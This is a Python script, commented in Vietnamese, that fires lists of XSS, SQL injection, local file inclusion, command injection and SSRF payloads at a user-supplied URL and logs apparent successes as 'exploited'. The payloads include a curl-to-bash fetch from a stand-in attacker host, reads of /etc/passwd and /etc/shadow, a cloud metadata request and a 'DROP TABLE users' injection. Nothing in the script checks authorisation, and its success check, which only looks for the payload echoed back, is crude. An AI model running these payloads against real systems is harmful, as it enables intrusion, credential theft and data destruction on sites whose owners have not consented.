import requests
import re

#  Danh sách Payloads 
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
    "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E",
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<body onload=alert('XSS')>",
    "<input type='text' value='XSS' onfocus=alert('XSS')>",
    "`; alert('XSS') //",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT null, version() --",
    "admin' --",
    "' OR 1=1#",
    "' OR 'a'='a' --",
    "\" OR \"a\"=\"a",
    "'; DROP TABLE users --",
    "' OR '1'='1' /*",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "/../../../../etc/shadow",
    "/../../../../proc/self/environ",
]

RCE_PAYLOADS = [
    "; ls",
    "; cat /etc/passwd",
    "; whoami",
    "& ping -c 5 127.0.0.1",
    "| curl http://attacker.com/shell.sh | bash",
    "`id`",
    "$(id)",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/admin",
    "http://127.0.0.1:8080/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
    "http://evil.com/?redirect=http://localhost",
]

#  Hàm test payloads
def test_payloads(url, method, data, payloads, vuln_name):
    try:
        for payload in payloads:
            test_url = url.replace("FUZZ", payload)

            if method == "GET":
                response = requests.get(test_url, timeout=5)
            elif method == "POST" and data:
                for key in data:
                    data[key] = payload
                response = requests.post(url, data=data, timeout=5)
            else:
                print("[-] Unsupported HTTP method")
                return False

            print(f"[*] Testing {vuln_name} payload: {payload}")
            print(f"[*] Status Code: {response.status_code}")
            print(f"[*] Response Content:\n", response.text[:500])

            if payload in response.text:
                print(f"[!!!] {vuln_name} Exploited with payload: {payload}")
                with open(f"{vuln_name.lower()}_results.txt", "a") as f:
                    f.write(f"Exploited: {test_url}\n")
                return True
        print(f"[-] No {vuln_name} payload executed successfully.")
        return False
    except requests.RequestException as e:
        print(f"[!] Error sending request: {e}")
        return False

#  Các hàm tấn công
def exploit_xss(url, method="GET", data=None):
    return test_payloads(url, method, data, XSS_PAYLOADS, "XSS")

def exploit_sqli(url, method="GET", data=None):
    return test_payloads(url, method, data, SQLI_PAYLOADS, "SQL Injection")

def exploit_lfi(url):
    return test_payloads(url, "GET", None, LFI_PAYLOADS, "LFI")

def exploit_rce(url):
    return test_payloads(url, "GET", None, RCE_PAYLOADS, "RCE")

def exploit_ssrf(url):
    return test_payloads(url, "GET", None, SSRF_PAYLOADS, "SSRF")

# Chạy chương trình
if __name__ == "__main__":
    target_url = input("Enter vulnerable URL (replace payload location with FUZZ): ")
    method = input("Enter HTTP method (GET/POST): ").upper()

    post_data = None
    if method == "POST":
        fields = input("Enter POST parameters (key=value,key2=value2): ")
        post_data = dict(re.findall(r"(\w+)=([\w@./-]+)", fields))

    print("\nSelect vulnerability type to test:")
    print("1. XSS")
    print("2. SQL Injection")
    print("3. LFI")
    print("4. RCE")
    print("5. SSRF")

    choice = input("Enter choice (1-5): ")

    if choice == "1":
        exploit_xss(target_url, method, post_data)
    elif choice == "2":
        exploit_sqli(target_url, method, post_data)
    elif choice == "3":
        exploit_lfi(target_url)
    elif choice == "4":
        exploit_rce(target_url)
    elif choice == "5":
        exploit_ssrf(target_url)
    else:
        print("Invalid choice.")
